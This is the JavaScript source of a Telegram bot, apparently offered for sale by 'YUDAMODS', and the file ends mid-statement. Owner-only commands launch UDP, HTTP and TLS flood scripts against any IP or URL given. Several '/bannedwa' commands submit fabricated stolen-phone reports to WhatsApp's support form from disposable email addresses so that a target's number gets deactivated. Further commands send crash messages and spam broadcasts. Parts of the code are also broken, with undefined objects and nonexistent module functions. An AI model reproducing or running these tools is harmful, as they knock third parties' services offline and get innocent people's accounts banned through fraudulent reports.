const { Telegraf } = require('telegraf');
const { TELEGRAM_BOT_TOKEN } = require('./settings');
const axios = require('axios');
const cheerio = require('cheerio');
const figlet = require('figlet');
const chalk = require('chalk');
const fs = require('fs');
const { watchFile, unwatchFile } = fs;
const { fileURLToPath } = require('url');
const dgram = require('dgram');
const util = require('util');
//const exec = require('child_process').exec;
const { exec } = require('child_process');
const settings = require('./settings');

const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

let userList = [];

let attacking = false;

const thumbPath = 'https://telegra.ph/file/2c9967f6cc7b9ad4a7adc.jpg';

const qris = 'https://telegra.ph/file/924d6b505aed7688446ac.jpg';

const ownerId = '5887546516';

const youtubeLink = 'https://youtube.com/@YUDAMODS';

const voiceUrl = 'https://i.top4top.io/m_3034rp9rf0.mp3';
  
const voiceOwner = 'https://e.top4top.io/m_30347zsfm1.mp3';

async function loading() {
    const loadingMessages = [
        "⌛ Loading [10%]",
        "⏳ Loading [30%]",
        "⌛ Loading [50%]",
        "⏳ Loading [80%]",
        "⌛ Loading [100%]",
        "Loading Selesai..."
    ];

    for (let i = 0; i < loadingMessages.length; i++) {
        const message = loadingMessages[i];
        const sentMessage = await bot.telegram.sendMessage(ctx.chat.id, message);
        await new Promise(resolve => setTimeout(resolve, 1000));
        await bot.telegram.editMessageText(ctx.chat.id, sentMessage.message_id, null, message);
    }
}

bot.start((ctx) => {
    ctx.replyWithPhoto(thumbPath, { caption:'Selamat Datang Di Bot YudaMods Ketik /menu Untuk Menampilkan Fitur Bot' });
});

bot.use((ctx, next) => {
    console.log(`[${new Date().toLocaleString()}] Received message from ${ctx.from.username}: ${ctx.message.text}`);
    next();
});

bot.start((ctx) => {
    const userId = ctx.message.from.id;
    const userNumber = ctx.message.from.username || ctx.message.from.id.toString(); 

    const existingUser = userList.find(user => user === `${userId}/${userNumber}`);

    if (!existingUser) {
        userList.push(`${userId}/${userNumber}`);
        ctx.reply(`Selamat datang, ${userNumber}. Anda telah ditambahkan ke daftar.`);
    }
});

bot.command('buysc', (ctx) => {
    ctx.replyWithMarkdown(`
BUY SC?
NO ENC - 50K
🔥 TELEGRAM @YUDAMODS 🔥
`, Markup.inlineKeyboard([
        Markup.urlButton('🛒 CONTACT 🛒', 'https://t.me/YUDAMODS')
    ]));
});


bot.command('bc', (ctx) => {
    const bcMessage = ctx.message.text.split(' ').slice(1).join(' ');

    switch (true) {
        case !bcMessage:
            ctx.reply('Contoh penggunaan:\n/bc Pesan Anda');
            break;

        default:
            userList.forEach(user => {
                const [userId, userNumber] = user.split('/');
                bot.telegram.sendPhoto(userNumber, { source: thumbPath }, { caption: bcMessage });
            });

            ctx.reply('Pesan broadcast telah dikirim ke semua pengguna.');
            break;
    }
});



bot.command('jpm', (ctx) => {
    const jpmMessage = ctx.message.text.split(' ').slice(1).join(' ');

    switch (true) {
        case !jpmMessage:
            ctx.reply('Contoh penggunaan:\n/jpm Pesan Anda');
            break;

        default:
            userList.forEach(user => {
                const [userId, userNumber] = user.split('/');
                bot.telegram.sendPhoto(userNumber, { source: thumbPath }, { caption: jpmMessage });
            });

            ctx.reply('Pesan jpm telah dikirim ke semua pengguna.');
            break;
    }
});

      
      
bot.command('ceksaldo', async (ctx) => {
    const user = ctx.from;
    const saldo = await getSaldo(user.id);
    ctx.reply(`Saldo kamu saat ini Rp${saldo}`);
});

/*bot.command('deposit', async (ctx) => {
    ctx.replyWithPhoto(qris, { caption: 'Silahkan scan QRIS berikut untuk melakukan deposit'});
    await ctx.reply('Setelah melakukan transfer, kirimkan bukti transfer dengan format: /bukti [jumlah transfer]');
}); */

bot.command('bukti', async (ctx) => {
    let bukti = ctx.message.text.replace('/bukti ', '');
    let [jumlah, bukti_file_id] = bukti.split(' ');
    jumlah = parseInt(jumlah);

    if (!jumlah || !bukti_file_id) {
        await ctx.reply('Format bukti transfer salah. Coba ulangi dengan format: /bukti [jumlah transfer] [bukti transfer file id]');
    }
    else {
        await ctx.reply('Bukti transfer telah diterima. Kami akan memproses deposit kamu segera.');
        await saveDeposit(ctx.from.id, jumlah, bukti_file_id);
    }
});

bot.command('confirm', async (ctx) => {
    let deposit = await getDeposit(ctx.message.text.replace('/confirm ', ''));
    if (!deposit) {
        await ctx.reply('Deposit tidak ditemukan.');
    }
    else {
        await updateSaldo(deposit.user_id, deposit.jumlah);
        await setDepositStatus(deposit.id, 'confirmed');
        await ctx.reply(`Deposit Rp${deposit.jumlah} telah dikonfirmasi. Saldo kamu saat ini Rp${await getSaldo(deposit.user_id)}.`);
    }
});

bot.on('text', async (ctx) => {
  const message = ctx.message.text;
  const messageText = ctx.message.text;
  const command = message.split(' ')[0];
  const now = new Date();
  const hour = now.getHours();
  const greeting = getGreeting(hour);
  const name = ctx.from.first_name;
  const tag = ctx.from.username;


  switch (command) {
    case '/menu':
     // await loading();
      const menuText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /pushkontakmenu
┃⿻ /allmenu
┃⿻ /ddosmenu
┃⿻ /verifymenu
┃⿻ /bugmenu
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      await ctx.replyWithVoice({ url: voiceUrl });
      ctx.replyWithPhoto(thumbPath, { caption: menuText });
      break;
      
      case '/verifymenu':
      //await loading();
      const verifyText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /bannedwa
┃⿻ /bannedwav2
┃⿻ /bannedwav3
┃⿻ /bannedwav4
┃⿻ /bannedwav5
┃⿻ /unbanwa
┃⿻ /unbanwav2
┃⿻ /unbanwav3
┃⿻ /unbanwav4
┃⿻ /unbanwav5
┃⿻ /resetotpwa
┃⿻ /resetotpwav2
┃⿻ /resetotpwav3
┃⿻ /temp
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      await ctx.replyWithVoice({ url: voiceUrl });
      ctx.replyWithPhoto(thumbPath, { caption: verifyText });
      break;

    case '/allmenu':
      //await loading();
      const allmenuText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /menu
┃⿻ /bannedwa
┃⿻ /bannedwav2
┃⿻ /bannedwav3
┃⿻ /bannedwav4
┃⿻ /bannedwav5
┃⿻ /unbanwa
┃⿻ /unbanwav2
┃⿻ /unbanwav3
┃⿻ /unbanwav4
┃⿻ /unbanwav5
┃⿻ /resetotpwa
┃⿻ /resetotpwav2
┃⿻ /resetotpwav3
┃⿻ /temp
┃⿻ /pushkontakmenu
┃⿻ /allmenu
┃⿻ /ddosmenu
┃⿻ /cekid
┃⿻ /pushkontak
┃⿻ /jpm
┃⿻ /bc
┃⿻ /udp
┃⿻ /ddos
┃⿻ /tlsvip
┃⿻ /https
┃⿻ /http
┃⿻ /mix
┃⿻ /owner
┃⿻ /buysc
┃⿻ /deposit
┃⿻ /ceksaldo
┃⿻ /bukti
┃⿻ /bugcrash
┃⿻ /sendcrash
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      await ctx.replyWithVoice({ url: voiceUrl });
      ctx.replyWithPhoto(thumbPath, { caption: allmenuText });
      break;
      
      case '/ddosmenu':
   //   await loading();
      const ddosText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /udp
┃⿻ /ddos
┃⿻ /tlsvip
┃⿻ /https
┃⿻ /http
┃⿻ /mix
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      await ctx.replyWithVoice({ url: voiceUrl });
      ctx.replyWithPhoto(thumbPath, { caption: ddosText });
      break;
      
      case '/bugmenu':
   //   await loading();
      const bugText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /bugcrash
┃⿻ /sendcrash
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      await ctx.replyWithVoice({ url: voiceUrl });
      ctx.replyWithPhoto(thumbPath, { caption: bugText });
      break;
      
      case '/owner':
      const creatorMessage = 'This is my owner: [YUDAMODS](https://t.me/YUDAMODS)';
      const replyMarkup = {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'Chat Creator YudaMods', url: 'https://t.me/YUDAMODS' }],
          ],
        },
      };
      await ctx.replyWithMarkdown(creatorMessage, replyMarkup);
      await ctx.replyWithVoice({ url: voiceOwner });
  //    logs('Creator response sent', 'green', `From: ${name} (@${tag || 'N/A'})`, `Date: ${now.toLocaleString()}`);
      break;
      

    case '/pushkontak':
    if (ctx.from.id.toString() === ownerId) {
    const pushkontakArgs = message.split(' ').slice(1).join(' ');
    const pushkontakParams = pushkontakArgs.split('|');

    if (pushkontakParams.length !== 3) {
        ctx.replyWithPhoto(thumbPath, { caption: "Format yang Anda masukkan salah. Silakan gunakan format: /pushkontak idgroup|jeda|teks" });
        return;
    }

    const idGroup = pushkontakParams[0];
    const jeda = parseInt(pushkontakParams[1]);
    const teks = pushkontakParams[2];

    if (!idGroup || !jeda || !teks) {
        ctx.replyWithPhoto(thumbPath, { caption: "Format yang Anda masukkan salah. Silakan gunakan format: /pushkontak idgroup|jeda|teks" });
        return;
    }

    ctx.replyWithPhoto(thumbPath, { caption: "Proses pengiriman kontak sedang berlangsung..." });

    try {
        const groupMetadata = await ctx.getChat(idGroup);
        const participants = groupMetadata.participants;
        const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
        
        for (let mem of halls) {
            if (/image/.test(mime)) {
                const media = await ctx.telegram.getFileLink(ctx.message.photo[0].file_id);
                await ctx.telegram.sendPhoto(mem, { source: media.href, caption: teks });
                await sleep(jeda);
            } else {
                await ctx.telegram.sendMessage(mem, teks);
                await sleep(jeda);
            }
        }

        ctx.replyWithPhoto(thumbPath, { caption: "Pengiriman kontak selesai!" });
    } catch (error) {
        ctx.replyWithPhoto(thumbPath, { caption: `Terjadi kesalahan: ${error.message}` });
    }


    } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
    break;
    
case '/udp':
      if (ctx.from.id.toString() === ownerId) {
      const udp = messageText.split(' ');
      
      if (udp.length === 3) {
        const ip = udp[1];
        const port = udp[2];
        
        const { yudamods1 } = require('child_process');

        yudamods1(`python2 udp.py ${ip} ${port} 0 0`, (error, stdout, stderr) => {
          if (error) {
            ctx.reply(`Error executing UDP flood: ${error.message}`);
            return;
          }

          if (stderr) {
            ctx.reply(`UDP flood failed: ${stderr}`);
            return;
          }

          ctx.reply(`UDP flood sent to ${ip}:${port}`);
        });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Usage: /udp <ip> <port>\nExample: /udp 1.1.1.1 80'});
      }
      
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;
      
      case '/bugcrash':
      if (ctx.from.id.toString() === ownerId) {
      const argsBugcrash = command.split(' ');
      const idBugcrash = argsBugcrash[1];
      
      if (idBugcrash) {
        const akunlo = settings.pp; // Anda mungkin perlu menambahkan setting.pp
        ctx.telegram.sendPhoto(idBugcrash, akunlo, { caption: `https://youtu.be/IQW49GINvj4` });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Format pesan tidak benar. Gunakan format: /bugcrash [id]'});
      }
      
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;

    case '/sendcrash':
      if (ctx.from.id.toString() === ownerId) {
      const argsSendcrash = command.split(' ');
      const idSendcrash = argsSendcrash[1];
      const akunlo = settings.pp; // Anda mungkin perlu menambahkan setting.pp
      
      if (idSendcrash && akunlo) {
        ctx.telegram.sendPhoto(idSendcrash, akunlo, { caption: `https://youtu.be/IQW49GINvj4` });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Format pesan tidak benar. Gunakan format: /sendcrash [id]'});
      }
      
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;

    case '/mix':
      if (ctx.from.id.toString() === ownerId) {
      const argsMix = command.split(' ');
      const url = argsMix[1];
      const time = argsMix[2];
      const thread = argsMix[3];
      const rate = argsMix[4];

      if (argsMix.length === 5 && url && time && thread && rate) {
        exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
          if (error || stderr) {
            console.error(`Error: ${error ? error.message : stderr}`);
            ctx.reply('Successful');
            return;
          }
          console.log(`stdout: ${stdout}`);
          ctx.reply('Proses telah dimulai.');
        });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Format pesan tidak benar. Gunakan format: /mix [url] [time] [thread] [rate]'});
      }

      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;

    case '/http':
      if (ctx.from.id.toString() === ownerId) {
      const argsHttp = command.split(' ');
      const web = argsHttp[1];
      const url = `https://check-host.net/check-http?host=${web}&csrf_token=`;

      if (argsHttp.length === 2 && web) {
        ctx.reply(`Klik link di bawah untuk melihat hasil: ${url}`);
      } else {
        ctx.reply('Format pesan tidak benar. Gunakan format : /http [url]');
      }

      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;
      
      
      case '/ddos':
      if (ctx.from.id.toString() === ownerId) {
      const ddos = messageText.split(' ');
      
      if (ddos.length === 7) {
        const method = ddos[1]
        const host = ddos[2];
        const proxies = ddos[3]
        const duration = ddos[4]
        const rate = ddos[5];
        const thread = ddos[6]
        
        const { yudamods2 } = require('child_process');

        yudamods2(`node ddos.js ${method} ${host} ${proxies} ${duration} ${rate} ${thread}`, (error, stdout, stderr) => {
          if (error) {
            ctx.reply(`Error executing Ddos Flood: ${error.message}`);
            return;
          }

          if (stderr) {
            ctx.reply(`Ddos flood failed: ${stderr}`);
            return;
          }

          ctx.reply(`Ddos flood sent to ${host}`);
        });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Usage: /ddos <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread(1-3)>\nExample: /ddos GET 1.1.1.1 proxies.txt 64 64 3'});
      }
      
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;
      
      case '/deposit':
      ctx.replyWithPhoto(qris, { caption: 'Silahkan scan QRIS berikut untuk melakukan deposit'});
      ctx.reply('Setelah melakukan transfer, kirimkan bukti transfer dengan format: /bukti [jumlah transfer]');
      ctx.telegram.sendMessage(
        `${ownerId}`,
        `Deposit baru dari ${name} (@${tag}). Silakan konfirmasi setelah menerima transfer.`
      );
      break;
      
      case '/tlsvip':
      
      if (ctx.from.id.toString() === ownerId) {
      const tls = messageText.split(' ');
      
      if (tls.length === 6) {
        const host = tls[1];
        const time = tls[2]
        const rps = tls[3]
        const threads = tls[4];
        const proxyfile = tls[5]
        
        const { yudamods3 } = require('child_process');

        yudamods3(`node tls-arz ${host} ${time} ${rps} ${threads} ${proxyfile}`, (error, stdout, stderr) => {
          if (error) {
            ctx.reply(`Error executing Ddos Flood: ${error.message}`);
            return;
          }

          if (stderr) {
            ctx.reply(`Tls Flood Vip failed: ${stderr}`);
            return;
          }

          ctx.reply(`Tls Flood Vip sent to ${host}`);
        });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Usage: /tlsvip <host> <time> <rps> <threads> <proxyfile(1-3)>\nExample: /tlsvip https://tls.mrrage.xyz 500 5 9 proxies.txt'});
      }
      
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;
      
      case '/https':      
      if (ctx.from.id.toString() === ownerId) {
      const https = messageText.split(' ');
      
      if (https.length === 5) {
        const url = https[1];
        const time = https[2]
        const req_per_sec = https[3]
        const threads = https[4];
        
        const { yudamods4 } = require('child_process');

        yudamods4(`node HTTPS.js ${url} ${time} ${req_per_sec} ${threads}`, (error, stdout, stderr) => {
          if (error) {
            ctx.reply(`Error executing Ddos Flood: ${error.message}`);
            return;
          }

          if (stderr) {
            ctx.reply(`Httls failed: ${stderr}`);
            return;
          }

          ctx.reply(`Https sent to ${host}`);
        });
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Usage: node HTTPS.js URL TIME REQ_PER_SEC THREADS\nExample: /https https://tls.mrrage.xyz 500 8 1'});
      }
      
      } else {
        ctx.replyWithPhoto(thumbPath, { caption: 'Maaf, Anda bukan owner bot.'});
      }
      break;
    
    case '/pushkontakmenu':
    const keyboard = {
        reply_markup: {
            keyboard: [
                [{ text: '/lanjutkan' }]
            ],
            resize_keyboard: true
        }
    };
    
    ctx.replyWithPhoto(thumbPath, { caption: `Anda yakin dengan pilihan Anda? Whatsapp Anda dapat diblokir jika baru saja menautkan dengan bot. Silahkan ketik /lanjutkan untuk melanjutkan.`, keyboard });
    break;

    case '/lanjutkan':
   //     await loading();
        const lanjutkanText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /cekid
┃⿻ /jpm
┃⿻ /bc
┃⿻ /pushkontak
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
        await ctx.replyWithVoice({ url: voiceUrl });
        ctx.replyWithPhoto(thumbPath, { caption: lanjutkanText });
        break;

    case '/cekid':
        const chatId = ctx.message.chat.id;
        ctx.replyWithPhoto(thumbPath, { caption: `Cek ID Group:\nChat ID: ${chatId}` });
        break;
        
    case '/bannedwa':
    case '/kenonwa':
    case '/banned':
            const bannedArgs = message.split(' ');
            const bannedPhoneNumber = bannedArgs.length > 1 ? bannedArgs[1] : null;
            if (!bannedPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Perdido/roubado: desative minha conta");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            
     case '/unbannedwa':
     case '/unbanwa':
     case '/unban':
            const unbannedArgs = message.split(' ');
            const unbannedPhoneNumber = unbannedArgs.length > 1 ? unbannedArgs[1] : null;
            if (!unbannedPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", unbannedPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "مرحبًا ، أنا رودولفو ، أحتاج إلى مساعدتك ، لقد سُرق هاتفي المحمول ومعه شريحتي مع WhatsApp ، لا أريد أن أفسد أشيائي الشخصية ، مثل الأشياء من شركتي وخططي ، أريد رقمي معطل! حتى أتمكن من استعادة بطاقة Sim أو محاولة استرداد هاتفي! الرقم");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/bannedwav2':
            const bannedwav2Args = message.split(' ');
            const bannedwav2PhoneNumber = bannedwav2Args.length > 1 ? bannedwav2Args[1] : null;
            if (!bannedwav2PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedwav2PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Hola, aghju persu i mo documenti cù u mo telefunu è a carta SIM. dunque vogliu chì disattiveghjanu u mo numeru immediatamente sò statu piratatu, aghju paura chì qualchissia pò entra in u mo contu WhatsApp perchè anu infurmazioni impurtanti nantu à mè u numeru hè");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/bannedwav3':
            const bannedwav3Args = message.split(' ');
            const bannedwav3PhoneNumber = bannedwav3Args.length > 1 ? bannedwav3Args[1] : null;
            if (!bannedwav3PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedwav3PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Hola, soy nuevo en la aplicación de WhatsApp, y hoy en el primer día noté que un usuario usaba otra versión modificada de WhatsApp, por lo que presenté esta denuncia, espero que el Equipo de WhatsApp bloquee el número");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/bannedwav4':
            const bannedwav4Args = message.split(' ');
            const bannedwav4PhoneNumber = bannedwav4Args.length > 1 ? bannedwav4Args[1] : null;
            if (!bannedwav4PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedwav4PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Porfavor,desative o número da minha conta ,o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/bannedwav5':
            const bannedwav5Args = message.split(' ');
            const bannedwav5PhoneNumber = bannedwav5Args.length > 1 ? bannedwav5Args[1] : null;
            if (!bannedwav5PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedwav5PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Olá, perdi meu dispositivo e cartão SIM, por isso imploro que desative meu número imediatamente");
